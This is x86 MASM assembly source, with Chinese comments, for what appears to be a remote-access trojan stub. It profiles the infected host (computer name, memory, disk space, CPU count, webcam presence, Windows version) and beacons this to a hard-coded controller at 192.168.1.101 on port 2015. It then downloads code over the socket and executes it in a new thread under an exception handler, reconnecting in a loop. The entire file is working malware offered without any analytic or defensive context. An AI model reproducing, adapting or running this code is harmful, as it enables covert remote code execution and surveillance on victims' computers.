.386
.model flat,stdcall
option casemap:none

include windows.inc
include user32.inc
include kernel32.inc
includelib kernel32.lib
includelib user32.lib
include  Macro.inc
include ws2_32.inc
includelib ws2_32.lib
include avicap32.inc
includelib avicap32.lib

CODE_LENGTH  equ  10240

nPort   equ   2015

ULARGE_INTEGERT STRUCT
      lowpart  DWORD ?
      highpart DWORD ?
ULARGE_INTEGERT  ENDS

.data
 szdll        db    "kernel32.dll",0
 szAPI1       db    "LoadLibraryA",0
 szAPI2       db    "GetProcAddress",0
 szIP         db    "192.168.1.101",0
 lpRecvBuff   dd    0
 lpRecvPositie dd    0
 szFormat     db  "%dG",0
szCpan       db  'C'
             db  ':',0
capYes       db  '有',0
capNo        db  '——',0
cmdname      db  '\cmd.exe',0
szVersion1   db  "windows NT SP%d",0
szVersion2   db  "windows 2000 SP%d",0
szVersion3   db  "windows XP SP%d",0
szVersion4   db  "windows 2003 SP%d",0
szVersion5   db  "windows vista SP%d",0
szVersion6   db  "windows 7 SP%d",0
szVersion7   db  "windows 8 SP%d",0
.data?
 ThreadID  dd    ?
 hevent    dd    ?
 sin     sockaddr_in  <?>
 event     WSANETWORKEVENTS   <?>
 wsaData  WSADATA  <?>
 hSocket   dd    ?
 lpgetstart    dd              ?

.code
_DealCodePack  proc   uses esi edi ebx _hSocket
    invoke	recv,_hSocket,lpRecvPositie,5120,NULL
	add lpRecvPositie,eax
	ret
_DealCodePack  endp

_DealAllPack  proc uses esi edi ebx _hSocket
	    invoke _DealCodePack,_hSocket
	ret
_DealAllPack  endp

_SandboxPort  proc uses esi ebx edi _lpCanshu
    local   lpProc
	mov    ebx,_lpCanshu
	mov    esi,_lpCanshu
	add    esi,8
	invoke LoadLibrary,offset szdll
	mov    edi,eax
	invoke GetProcAddress,edi,offset szAPI1
	
	mov    [ebx],eax
	
	add    ebx,4
	
	invoke GetProcAddress,edi,offset szAPI2
	mov    [ebx],eax
	
	mov  ebx,_lpCanshu
	mov  eax,esi
	push ebx
	push eax
	mov  eax,offset ThreadMain
	call eax
	push eax
	invoke GlobalFree,ebx
	pop  eax
	ret
_SandboxPort  endp

ThreadMain proc lpBeginsub,lpCodebegin
	    assume fs:nothing
		push   lpCodebegin
		push   offset _Handler
    	push   fs:[0]
        mov    fs:[0],esp
		call   lpBeginsub
	    assume fs:nothing
		pop  fs:[0]
		pop  eax
		pop  eax
		ret
ThreadMain  endp	

_Handler	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext
		local	@szBuffer[256]:byte
		pushad
		call @F
	@@:
	    pop  ebx
		sub  ebx,offset @B
		mov	edi,_lpContext
		assume	edi:ptr CONTEXT
		mov eax, offset _SafePlace
		add eax,ebx
		mov	[edi].regEip,eax
		assume	edi:nothing
		popad
		mov ebx,_lpSEH
		mov eax,[ebx + 8]
		invoke GlobalFree,eax
		mov	eax,ExceptionContinueExecution
		ret
_Handler	endp

_SafePlace:
        invoke ExitThread,0
		ret
		
gettStart   proc uses esi ebx ecx edi
    local    szbuffer
	local    szInter
	local    FreeTotalableNumber:ULARGE_INTEGERT
	local    TotalNumber:ULARGE_INTEGERT
	local    FreeTotalNumber:ULARGE_INTEGERT
	local	@stMemInfo:MEMORYSTATUS
	local    OsVerInfoEx:OSVERSIONINFOEX
	local    siSysInfo:SYSTEM_INFO
	invoke	GlobalAlloc,GPTR,2048
	mov      szbuffer,eax
	mov      szInter,255
	mov      esi,szbuffer
	assume   esi:ptr byte
	mov      [esi],0               ;写上表头，让主控端识别(登录消息)
	add      esi,1
	invoke   GetComputerName,esi,addr szInter              ;获得计算机名称
	invoke   lstrlen,esi
	add      esi,eax
	add      esi,1                                         ;跳过结尾的0
	;获取虚拟内存的总大小
	mov	    @stMemInfo.dwLength,sizeof @stMemInfo
    invoke	GlobalMemoryStatus,addr @stMemInfo
	mov      edx,0
	mov      eax,@stMemInfo.dwTotalPageFile                ;获取虚拟内存的总大小
	mov      ebx,1024
	div      ebx
	mov      edx,0
	div      ebx
	mov      edx,0
	div      ebx
	invoke   wsprintf,esi,addr szFormat,eax                ;格式转换进入到esi
	invoke   lstrlen,esi
	add      esi,eax
	add      esi,1
	;循环搜索出所有有盘的空间并且加在一起
	xor      edi,edi
	.while    TRUE
	invoke   GetDiskFreeSpaceEx,addr szCpan,addr FreeTotalableNumber,addr TotalNumber,addr FreeTotalNumber
	.if       eax
	mov       eax,1024
	mov       edx,0
	mov       ebx,1024
    mul       ebx
	mov       edx,0
	mul       ebx
	mov       ebx,eax
	mov       eax,TotalNumber.lowpart
	mov       edx,TotalNumber.highpart
	div       ebx
	add       edi,eax
	inc       szCpan
	.else
	     .break
	.endif
	.endw
	invoke    wsprintf,esi,addr szFormat,edi                ;统一格式到esi
	;获取cpu处理器的个数
	invoke   lstrlen,esi
	add      esi,eax
	inc      esi
	invoke   GetSystemInfo,addr siSysInfo
	mov      eax,siSysInfo.dwNumberOfProcessors
	push     eax
	call @F 
	     db   "%d个",0
	@@:
	push  esi
	call  wsprintf
	add esp,0Ch 
	;获取摄像头设备
	invoke   lstrlen,esi
	add      esi,eax
	inc      esi
	xor edi,edi
	.while edi < 10
	 invoke capGetDriverDescription,NULL,NULL,NULL,NULL,NULL
	  .if eax
	      invoke lstrcpy,esi,addr capYes
		  jmp @F
	  .endif
	  inc edi
	.endw
	 invoke lstrcpy,esi,addr capNo
	@@:
	;获取系统版本
	invoke   lstrlen,esi
	add      esi,eax
	add      esi,1 	
	mov     OsVerInfoEx.dwOSVersionInfoSize,sizeof OSVERSIONINFOEX
	invoke  GetVersionEx,addr OsVerInfoEx
	mov     eax,OsVerInfoEx.dwMajorVersion
	mov     ebx,OsVerInfoEx.dwMinorVersion
	.if     eax <= 4
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion1,eax
	.elseif     eax == 5 && ebx == 0
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion2,eax
	.elseif     eax == 5 && ebx == 1
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion3,eax
    .elseif     eax == 5 && ebx == 2
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion4,eax
	.elseif     eax == 6 && ebx == 0
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion5,eax
	.elseif     eax == 6 && ebx == 1
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion6,eax
	.else
	      mov  eax,DWORD ptr OsVerInfoEx.wServicePackMajor
	      invoke wsprintf,esi,addr szVersion7,eax
    .endif	

	mov eax,szbuffer
	mov lpgetstart,eax
	ret
gettStart   endp

start:
  call @F
   db   "CrazyLove"
  @@:
  push FALSE
  push NULL
  call CreateMutex
  invoke GetLastError
  .if eax == ERROR_ALREADY_EXISTS
	invoke ExitProcess,NULL
  .endif
  invoke WSAStartup,101,offset wsaData
  call   gettStart
  @@:
  invoke socket,AF_INET,SOCK_STREAM,NULL
  mov    hSocket,eax
  invoke htons,nPort
  mov    sin.sin_port,ax
  mov    sin.sin_family,AF_INET
  invoke inet_addr,addr szIP
  mov    sin.sin_addr,eax
  .while TRUE
  invoke connect,hSocket,addr sin,sizeof sin
  .break .if ! eax                           ;如果没有连接成功，那就睡5秒钟
  invoke Sleep,5000
  .endw
  invoke WSACreateEvent
  mov    hevent,eax
  invoke WSAEventSelect,hSocket,hevent,FD_CONNECT or FD_CLOSE
  .while TRUE
  invoke WSAWaitForMultipleEvents,1,offset hevent,TRUE,WSA_INFINITE,FALSE
  invoke WSAEnumNetworkEvents,hSocket,hevent,offset event
  .if event.lNetworkEvents & FD_CONNECT                        ;连接成功
      push   hevent
      invoke WSACreateEvent
      mov    hevent,eax
      invoke WSAEventSelect,hSocket,hevent, FD_READ or FD_CLOSE
	  invoke GlobalAlloc,GPTR,10240
	  mov    lpRecvBuff,eax
	  mov    lpRecvPositie,eax
      call   CloseHandle 
	  invoke send,hSocket,lpgetstart,2048,0
  .elseif event.lNetworkEvents & FD_READ                       ;接收到消息了，快去处理
      invoke	_DealAllPack,hSocket
  .elseif event.lNetworkEvents & FD_CLOSE                      ;对方下线了，唉唉唉唉!
      mov   esi,offset _SandboxPort
	  invoke	CreateThread,NULL,0,esi,lpRecvBuff,NULL,addr ThreadID
	  invoke  CloseHandle,eax
	  invoke closesocket,hSocket
	  invoke Sleep,3000
	  jmp @B
  .endif
  .endw
	jmp @B
	end start
	